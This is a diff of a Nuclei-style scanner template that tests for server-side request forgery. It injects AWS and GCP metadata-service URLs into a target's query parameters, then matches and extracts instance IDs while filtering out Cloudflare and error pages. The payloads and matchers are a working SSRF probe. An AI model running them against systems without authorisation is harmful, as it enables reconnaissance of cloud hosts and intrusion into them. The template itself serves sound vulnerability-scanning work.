@@ -1,6 +1,6 @@
-Id: THENAWABX_MULTI_CLOUD_SSRF
+id: THENAWABX_MULTI_CLOUD_SSRF
 info:
-  name: 📑 Nawab-Multi-Cloud-SSRF 📑
+  name: 🛰️ Nawab-Multi-Cloud-SSRF 🛰️
   author: thenawabx
   severity: critical
 
@@ -10,27 +10,50 @@ http:
       - "{{BaseURL}}"
     payloads:
       cloud_metadata:
-        - "http://169.254.169.254/computeMetadata/v1/instance/id" # GCP
-        - "http://169.254.169.254/latest/meta-data/instance-id" # AWS
+        - "http://169.254.169.254/computeMetadata/v1/instance/id"
+        - "http://169.254.169.254/latest/meta-data/instance-id"
+
     fuzzing:
       - part: query
         type: replace
+        mode: multiple
         fuzz:
           - "{{cloud_metadata}}"
+
     matchers-condition: and
     matchers:
       - type: status
         status:
           - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "i-[a-f0-9]{17}" # AWS Instance ID
+          - "^[0-9]{15,25}$" # GCP Instance ID
+        condition: or
+
+      - type: word
+        part: header
+        negative: true
+        words:
+          - "Cloudflare"
+          - "Server: Akamai"
+
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "Forbidden"
+          - "Access Denied"
+          - "403"
+          - "404"
+          - "example"
+          - "placeholder"
+
+    extractors:
       - type: regex
         part: body
         regex:
           - "i-[a-f0-9]{17}"
           - "[0-9]{15,}"
-      - type: word
-        part: body
-        negative: true
-        words:
-          - "Cloudflare"
-          - "Forbidden"
-          - "Access Denied"
